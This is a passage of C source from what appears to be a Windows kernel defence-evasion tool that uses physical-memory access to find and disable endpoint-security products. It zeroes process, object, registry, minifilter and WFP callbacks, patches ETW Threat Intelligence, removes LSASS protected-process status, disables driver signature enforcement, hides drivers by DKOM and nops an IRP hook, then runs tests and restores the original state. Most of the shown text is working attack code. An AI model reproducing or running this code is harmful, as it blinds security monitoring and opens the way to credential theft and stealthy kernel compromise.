            snprintf(nt_path,sizeof nt_path,"%s\\ntoskrnl.exe",sd);
    }
    free(ml);
    printf("[*] ntoskrnl VA=0x%016llX  size=0x%llX\n",(unsigned long long)nt_va,(unsigned long long)nt_size);

    /* Read ntoskrnl from disk */
    HANDLE hf=CreateFileA(nt_path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if(hf==INVALID_HANDLE_VALUE){printf("[-] Cannot open %s\n",nt_path);CloseHandle(g_dev);return 1;}
    DWORD pe_sz=GetFileSize(hf,NULL); uint8_t *pe=(uint8_t*)malloc(pe_sz); DWORD rd=0;
    ReadFile(hf,pe,pe_sz,&rd,NULL); CloseHandle(hf);
    printf("[*] ntoskrnl disk: %lu bytes\n\n",(unsigned long)pe_sz);
    g_nt_va = nt_va; g_nt_pe = pe; g_nt_pe_sz = pe_sz;

    /* Find ntoskrnl PA */
    printf("[*] Finding ntoskrnl PA...\n");
    uint64_t nt_pa=find_ntoskrnl_pa(nt_path);
    if(!nt_pa){printf("[-] ntoskrnl PA not found\n");free(pe);CloseHandle(g_dev);return 1;}
    printf("[+] ntoskrnl PA=0x%016llX\n\n",(unsigned long long)nt_pa);
    g_nt_pa = nt_pa; /* enables init_pstype_va() in combined_pool_scan */

    /* Resolve watchdog target VAs + find FLT stub for sysdiag A.6 */
    wk_resolve_targets(pe,pe_sz,nt_va);
    g_flt_stub_va = flt_find_stub_va(pe,pe_sz,nt_va,nt_pa);
    if(g_flt_stub_va)
        printf("  [flt_stub] xor eax,eax;ret @ VA=0x%llX\n",(unsigned long long)g_flt_stub_va);
    else
        printf("  [flt_stub] WARNING: stub not found — A.6 will be skipped\n");

    SetConsoleCtrlHandler(ctrl_handler,TRUE);

    /* ── SCAN PHASE ─────────────────────────────────────────────────── */
    printf("══════════════════════════════════════════════════════════\n");
    printf(" PHASE 1: SCAN (read-only, no changes yet)\n");
    printf("══════════════════════════════════════════════════════════\n\n");

    /* Ps* notify — pass accumulating exclusion list so each array gets a unique VA */
    printf("[1/6] Ps* notify callback arrays (LEA scan)...\n");
    uint64_t ps_excl[4]={0}; int ps_nexcl=0;
    for(int i=0;i<3;i++){
        g_ps[i].array_va=ps_find_array(pe,pe_sz,nt_pa,nt_va,nt_size,g_ps[i].setter,ps_excl,ps_nexcl);
        if(g_ps[i].array_va){
            g_ps[i].array_pa=nt_pa+(g_ps[i].array_va-nt_va);
            ps_excl[ps_nexcl++]=g_ps[i].array_va; /* exclude this VA from subsequent searches */
            int live=0;
            for(int j=0;j<g_ps[i].max;j++){uint64_t v=0;phys_read(g_ps[i].array_pa+(uint64_t)j*8,&v,8);if(v) live++;}
            printf("    %-38s  live=%d  PA=0x%016llX\n",g_ps[i].name,live,(unsigned long long)g_ps[i].array_pa);
        } else {
            printf("    %-38s  NOT FOUND\n",g_ps[i].name);
        }
    }

    /* ── Combined pool scan: OB + FLT + CM + WFP in a single memory pass ── */
    printf("\n[2/6] Pool scan (OB + FLT + CM + WFP) — single pass, chunk=%uKB...\n",
           (unsigned)(CHUNK_SZ>>10));
    if(!g_flt_raw){g_flt_raw=(FltNode*)calloc(FLT_MAX_RAW,sizeof(FltNode));if(!g_flt_raw){printf("[-] OOM\n");goto cleanup;}}
    combined_pool_scan();
    printf("\n");

    /* OB results */
    {int e=0;for(int i=0;i<g_ob_n;i++) if(is_edr_target(g_ob[i].drv)) e++;
     printf("    OB  callbacks : %d total, %d EDR\n",g_ob_n,e);}

    /* FLT results */
    printf("    FLT candidates: %d raw  →  grouping...\n",g_flt_n_raw);
    flt_scan_stage2();
    {int e=0;for(int i=0;i<g_flt_n_grp;i++) if(g_flt_grp[i].cls==DRV_OTHER) e++;
     printf("    FLT groups    : %d total, %d EDR\n",g_flt_n_grp,e);}
    free(g_flt_raw); g_flt_raw=NULL;

    /* CM results */
    {int ea=0,eb=0;for(int i=0;i<g_cm_n;i++){if(!is_edr_target(g_cm[i].drv)) continue;if(g_cm[i].has_altitude) ea++;else eb++;}
     int e=ea+eb;
     printf("    CM  callbacks : %d total, %d EDR (alt=%d noalt=%d)\n",g_cm_n,e,ea,eb);}

    /* WFP results */
    {int e=0;for(int i=0;i<g_wfp_n;i++) if(is_edr_target(g_wfp[i].drv)) e++;
     printf("    WFP callouts  : %d total, %d EDR\n",g_wfp_n,e);}

    /* ETW-TI */
    printf("\n[3/6] ETW-TI exports:\n");
    {int np=0,ne=0;
     for(int i=0;ETW_TI_FUNCS[i];i++){uint32_t r=pe_export_rva(pe,pe_sz,ETW_TI_FUNCS[i]);if(r) np++;else ne++;}
     printf("    Exported: %d  Not on this build: %d\n",np,ne);
     if(np==0) printf("    [!] EtwTiLog* not exported — Method A skipped, Method B (GUID) will run\n");}

    /* Watchdog scan */
    printf("\n[4/6] Watchdog — scanning EDR driver code for IAT registration calls...\n");
    {
        char seen[32][64]; int ns=0;
        #define WK_ADD(n) do{if(is_edr_target(n)){int _f=0;for(int _j=0;_j<ns;_j++) if(_stricmp(seen[_j],(n))==0){_f=1;break;}if(!_f&&ns<32){strncpy(seen[ns],(n),63);seen[ns++][63]='\0';}}}while(0)
        for(int i=0;i<g_ob_n;i++)      WK_ADD(g_ob[i].drv);
        for(int i=0;i<g_flt_n_grp;i++) WK_ADD(g_flt_grp[i].driver);
        for(int i=0;i<g_cm_n;i++)      WK_ADD(g_cm[i].drv);
        #undef WK_ADD

        for(int di=0;di<ns;di++){
            uint64_t drv_va=0,drv_sz=0;
            for(int m=1;m<g_nmods;m++) if(_stricmp(g_mods[m].name,seen[di])==0){drv_va=g_mods[m].base;drv_sz=g_mods[m].size;break;}
            if(!drv_va) continue;
            printf("    Scanning %s...\n",seen[di]);
            uint64_t drv_pa=find_driver_pa_cached(seen[di]);
            if(!drv_pa){printf("      PA not found\n");continue;}
            wk_scan_driver(seen[di],drv_pa,drv_va,drv_sz);
        }
        printf("    Total call sites: %d\n",g_wk_n);
    }

    /* SSDT hook detection (360 Total Security PatchGuard bypass) */
    printf("\n[5/6] SSDT hook detection (KiServiceTable vs disk PE)...\n");
    ssdt_scan();

    /* PPL EPROCESS scan */
    printf("\n[6/6] PPL bypass — EPROCESS scan (LSASS)...\n");
    {
        ppl_detect_offsets();
        g_lsass_pid = get_pid_by_name("lsass.exe");
        if (g_lsass_pid) {
            printf("    LSASS PID=%u\n", g_lsass_pid);
            ppl_scan(g_lsass_pid, pe, pe_sz, nt_va);
        } else {
            printf("    [!] lsass.exe not found\n");
        }
        if (g_lsass_ep.valid)
            printf("    LSASS EPROCESS: found  NtQIP_prot=0x%02X  OFF_PROT=0x%X\n",
                   g_lsass_prot_api, g_ep_off_prot);
        else
            printf("    LSASS EPROCESS: NOT found\n");
    }

    /* CI.dll g_CiOptions location */
    printf("\n[+scan] g_CiOptions location (DSE)...\n");
    ci_find_opts();

    /* hrdevmon DriverObject (for IRP hook disable) */
    printf("\n[+scan] hrdevmon DriverObject scan...\n");
    {
        uint64_t hr_va_s = 0, hr_sz_s = 0;
        for (int i = 1; i < g_nmods; i++) {
            if (_stricmp(g_mods[i].name, "hrdevmon.sys") == 0) {
                hr_va_s = g_mods[i].base; hr_sz_s = g_mods[i].size; break;
            }
        }
        if (hr_va_s) {
            g_hrdev_drv_pa = hrdev_find_drv_obj(hr_va_s);
            if (!g_hrdev_drv_pa)
                printf("    [HRDEV] DriverObject not found — IRP hook disabled\n");
        } else {
            printf("    [HRDEV] not loaded — skipped\n");
        }
        (void)hr_sz_s;
    }

    /* Summary */
    print_edr_drivers();
    /* NOTE: do NOT free pe here — g_nt_pe aliases it and is used during
     * the apply phase (ob_zero_via_typelist, wk_scan, etc.).
     * The OS reclaims the ~13 MB when the process exits. */

    printf("\n══════════════════════════════════════════════════════════\n");
    printf(" PHASE 2: CONFIRM\n");
    printf("══════════════════════════════════════════════════════════\n\n");
    printf("  About to apply ALL EDR bypasses:\n");
    {int ps_live=0;for(int i=0;i<3;i++){for(int j=0;j<g_ps[i].max&&g_ps[i].array_pa;j++){uint64_t v=0;phys_read(g_ps[i].array_pa+(uint64_t)j*8,&v,8);if(v)ps_live++;}}
     printf("    [1] Watchdog Kill    — %d call site(s)\n",g_wk_n);
     printf("    [2] Ps* Notify       — %d live entries\n",ps_live);}
    {int e=0;for(int i=0;i<g_ob_n;i++)      if(is_edr_target(g_ob[i].drv))         e++;printf("    [3] ObCallbacks      — %d EDR\n",e);}
    {int e=0;for(int i=0;i<g_flt_n_grp;i++) if(is_edr_target(g_flt_grp[i].driver)||_stricmp(g_flt_grp[i].driver,"sysdiag.sys")==0) e++;printf("    [4] Minifilter       — %d EDR groups (incl. sysdiag)\n",e);}
    printf("    [5] ETW-TI           — Method A (exports) + Method B (GUID)\n");
    {int e=0;for(int i=0;i<g_cm_n;i++)      if(is_edr_target(g_cm[i].drv))         e++;printf("    [6] CmCallback       — %d EDR\n",e);}
    {int e=0;for(int i=0;i<g_wfp_n;i++)     if(is_edr_target(g_wfp[i].drv))        e++;printf("    [7] WFP Callouts     — %d EDR\n",e);}
    printf("    [+] SSDT Hook Clear  — %d hook(s) detected\n", g_ssdt_n);
    {printf("    [8] PPL (LSASS)      — %s NtQIP=0x%02X OFF=0x%X\n",
            g_lsass_ep.valid ? "ready," : "not found,",
            g_lsass_prot_api, g_ep_off_prot);}
    printf("    [+] ETW-TI Method C  — ntoskrnl section scan (fast pre-pass)\n");
    printf("    [+] g_CiOptions      — %s\n",
           g_ci_opts_va ? "found — DSE will be disabled" : "not found — skipped");
    printf("    [+] DKOM hide        — targets: sysdiag.sys hrdevmon.sys hrwfpdrv.sys\n");
    printf("    [+] hrdevmon IRP     — %s\n",
           g_hrdev_drv_pa ? "DriverObject found — IRP[CREATE,READ] will be nop'd"
                           : "DriverObject not found — skipped");
    printf("\n  Proceed? [y/N]: "); fflush(stdout);
    char yn[8]={0}; fgets(yn,sizeof yn,stdin);
    if(yn[0]!='y'&&yn[0]!='Y'){printf("  Aborted.\n");goto cleanup;}

    /* ── APPLY PHASE ────────────────────────────────────────────────── */
    printf("\n══════════════════════════════════════════════════════════\n");
    printf(" PHASE 3: APPLY\n");
    printf("══════════════════════════════════════════════════════════\n\n");

    printf("[0/8] Sysdiag watchdog disable...\n"); fflush(stdout);
    {
        int wd=kill_sysdiag_watchdog();
        if(wd){ g_sysdiag_wd_killed=1; printf("    OK — %d watchdog(s) neutered\n\n",wd); }
        else   printf("    [!] watchdog not neutered — PPL write will attempt anyway\n\n");
        fflush(stdout);
    }

    printf("[1/8] Watchdog Kill...\n"); fflush(stdout);
    {int ok=wk_apply(); printf("    Patched: %d/%d call sites\n\n",ok,g_wk_n); fflush(stdout);}

    printf("[2/8] Ps* Notify arrays...\n"); fflush(stdout);
    for(int i=0;i<3;i++){
        if(!g_ps[i].array_pa){printf("    %-38s  skipped (not found)\n",g_ps[i].name);continue;}
        int ok=ps_zero(&g_ps[i]);
        printf("    %-38s  zeroed=%d\n",g_ps[i].name,ok);
    }
    fflush(stdout);

    printf("\n[3/8] ObRegisterCallbacks...\n"); fflush(stdout);
    {
        int ok=ob_apply_edr();
        printf("    Pool-scan zeroed: %d EDR entries\n",ok); fflush(stdout);
        /* Walk _OBJECT_TYPE.CallbackList directly — catches entries pool-scan
         * missed (pool trampolines whose VA isn't in any driver image range). */
        printf("    [3/8] running ob_zero_via_typelist...\n"); fflush(stdout);
        int ok2=ob_zero_via_typelist();
        printf("    TypeList zeroed : %d sysdiag entries\n",ok2); fflush(stdout);
    }

    printf("\n[4/8] Minifilter PreOp functions...\n"); fflush(stdout);
    {int ok=flt_apply_edr(); printf("    Patched: %d unique functions\n",ok); fflush(stdout);}

    printf("\n[5/8] ETW-TI...\n"); fflush(stdout);
    {
        /* Method A: code-patch EtwTiLog* prologues — only if exports exist */
        int ma=0;
        HANDLE hf2=CreateFileA(nt_path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
        if(hf2!=INVALID_HANDLE_VALUE){
            DWORD psz2=GetFileSize(hf2,NULL); uint8_t *pe2=(uint8_t*)malloc(psz2); DWORD rd2=0;
            ReadFile(hf2,pe2,psz2,&rd2,NULL); CloseHandle(hf2);
            int has_exp=0;
            for(int i=0;ETW_TI_FUNCS[i];i++) if(pe_export_rva(pe2,psz2,ETW_TI_FUNCS[i])){has_exp=1;break;}
            if(has_exp){
                printf("    Method A (code patch):\n");
                ma=etw_patch_funcs(pe2,psz2,nt_pa);
                printf("    Patched: %d function(s)\n",ma);
            } else {
                printf("    Method A: skipped (EtwTiLog* not exported on this build)\n");
            }
            free(pe2);
        }
        printf("    Method B (IsEnabled GUID scan):\n");
        int mb=etw_disable_provider();
        printf("    IsEnabled: %s\n",mb?"zeroed":"not found (build may not be vulnerable)");
        fflush(stdout);
    }

    printf("\n[6/8] CmRegisterCallback...\n"); fflush(stdout);
    {int ok=cm_apply_edr(); printf("    Zeroed: %d EDR entries\n",ok); fflush(stdout);}

    printf("\n[7/8] WFP Callouts...\n"); fflush(stdout);
    {int ok=wfp_apply_edr(); printf("    Zeroed: %d EDR callout(s)\n",ok); fflush(stdout);}

    printf("\n[+/8] SSDT hook clear (360 Total Security)...\n"); fflush(stdout);
    {int ok=ssdt_apply();
     if(g_ssdt_n==0) printf("    No hooks — skipped\n");
     else printf("    Restored: %d/%d entries\n",ok,g_ssdt_n);
     fflush(stdout);}

    printf("\n[8/8] PPL bypass (LSASS.Protection)...\n"); fflush(stdout);
    {
        int ok=ppl_apply();
        if(!ok) printf("    FAILED\n");
        else if(!g_lsass_prot_api) printf("    (NtQIP=0x00 — not PPL-protected, no write needed)\n");
        fflush(stdout);
    }

    /* ETW-TI Method C — fast pre-pass on ntoskrnl .data sections */
    printf("\n[+/8] ETW-TI Method C (ntoskrnl section scan)...\n"); fflush(stdout);
    {
        int mc = etw_method_c();
        printf("    %s\n", mc ? "IsEnabled zeroed" : "not found (Method B covers full RAM)");
        fflush(stdout);
    }

    printf("\n[+/8] g_CiOptions patch (DSE disable)...\n"); fflush(stdout);
    {
        int ci_ok = ci_opts_disable();
        if (!ci_ok && !g_ci_opts_va)
            printf("    skipped (ci.dll not found)\n");
        fflush(stdout);
    }

    printf("\n[+/8] DKOM driver hiding (PsLoadedModuleList)...\n"); fflush(stdout);
    {
        int dh = dkom_hide_drivers();
        printf("    Hidden: %d driver(s)\n", dh);
        fflush(stdout);
    }

    printf("\n[+/8] hrdevmon IRP hook disable...\n"); fflush(stdout);
    {
        int hr_ok = hrdevmon_irp_disable();
        if (!hr_ok && !g_hrdev_drv_pa)
            printf("    skipped (hrdevmon not loaded)\n");
        fflush(stdout);
    }

    printf("\n[*] Cache eviction (multi-CCD)... "); fflush(stdout);
    cache_evict_multiccd();
    printf("done\n");
    g_anything_applied=1;

    /* ── SUMMARY ────────────────────────────────────────────────────── */
    printf("\n══════════════════════════════════════════════════════════\n");
    printf(" ALL EDR BYPASSES ACTIVE — running tests now\n");
    printf("══════════════════════════════════════════════════════════\n");
    fflush(stdout);

    /* Run all verification tests while bypasses are active */
    run_inline_tests(g_lsass_pid);

    /* ── RESTORE ────────────────────────────────────────────────────── */
    /* Snapshot what was zeroed BEFORE restore clears the flags */
    /* VSnap.sz = field width in bytes (4 for Enabled BOOL, 8 for pointer) */
    typedef struct{uint64_t pa; uint64_t orig; uint8_t sz;}VSnap;
    VSnap *vsnap=NULL; int vn=0, vcap=1024;
    vsnap=(VSnap*)malloc(vcap*sizeof(VSnap));
    if(vsnap){
        for(int i=0;i<3;i++)
            for(int j=0;j<g_ps[i].n_saved;j++)
                if(g_ps[i].entries[j].zeroed&&vn<vcap){
                    vsnap[vn].pa=g_ps[i].entries[j].entry_pa;
                    vsnap[vn].orig=g_ps[i].entries[j].orig_val;
                    vsnap[vn++].sz=8;}
        for(int i=0;i<g_ob_n;i++) if(g_ob[i].zeroed&&vn<vcap){
            if(g_ob[i].enabled_pa&&pa_in_range(g_ob[i].enabled_pa,4)){
                vsnap[vn].pa=g_ob[i].enabled_pa;
                vsnap[vn].orig=*(uint32_t*)g_ob[i].orig_en;
                vsnap[vn++].sz=4; /* Enabled is 4 bytes — compare only those */
            } else {
                vsnap[vn].pa=g_ob[i].preop_pa;
                vsnap[vn].orig=*(uint64_t*)g_ob[i].orig_pre;
                vsnap[vn++].sz=8;
            }
        }
        for(int i=0;i<g_cm_n;i++) if(g_cm[i].zeroed&&vn<vcap){
            vsnap[vn].pa=g_cm[i].func_pa; vsnap[vn].orig=*(uint64_t*)g_cm[i].orig; vsnap[vn++].sz=8;}
        for(int i=0;i<g_wfp_n;i++) if(g_wfp[i].zeroed&&vn<vcap){
            vsnap[vn].pa=g_wfp[i].classify_pa; vsnap[vn].orig=*(uint64_t*)g_wfp[i].orig_cl; vsnap[vn++].sz=8;}
        if(g_ppl_applied && g_lsass_ep.valid && vn<vcap){
            vsnap[vn].pa=g_lsass_ep.pa+(uint64_t)g_ep_off_prot;
            vsnap[vn].orig=g_lsass_ep.prot_orig;
            vsnap[vn++].sz=1;}
        for(int gi=0;gi<g_flt_n_grp;gi++)
            for(int j=0;j<g_flt_grp[gi].n;j++){
                FltNode *nd=&g_flt_grp[gi].nodes[j]; if(!nd->unlinked) continue;
                if(vn<vcap){vsnap[vn].pa=nd->ulpf_pa;vsnap[vn].orig=nd->ulpf_orig;vsnap[vn++].sz=8;}
                if(vn<vcap){vsnap[vn].pa=nd->ulnb_pa;vsnap[vn].orig=nd->ulnb_orig;vsnap[vn++].sz=8;}
            }
    }

    restore_all();

    printf("[*] Verifying restore...\n");
    int v_ok=0;
    for(int i=0;i<vn;i++){
        uint64_t cur=0;
        if(!phys_read(vsnap[i].pa,&cur,vsnap[i].sz)) continue;
        uint64_t mask=(vsnap[i].sz>=8)?~0ULL:((1ULL<<(vsnap[i].sz*8))-1);
        if((cur&mask)==(vsnap[i].orig&mask)) v_ok++;
    }
    if(vsnap) free(vsnap);
    printf("    %d/%d entries verified restored\n\n",v_ok,vn);
    if(v_ok<vn) printf("[!] %d entries not confirmed — likely re-registered by EDR (normal) or reboot needed\n\n",vn-v_ok);
    else         printf("[+] All entries confirmed restored.\n\n");
    printf("[+] Done. All EDR callbacks re-enabled.\n");
    fflush(stdout);

cleanup:
    if(pe) free(pe);
    if(g_flt_raw) free(g_flt_raw);
    CloseHandle(g_dev);
    return 0;
}
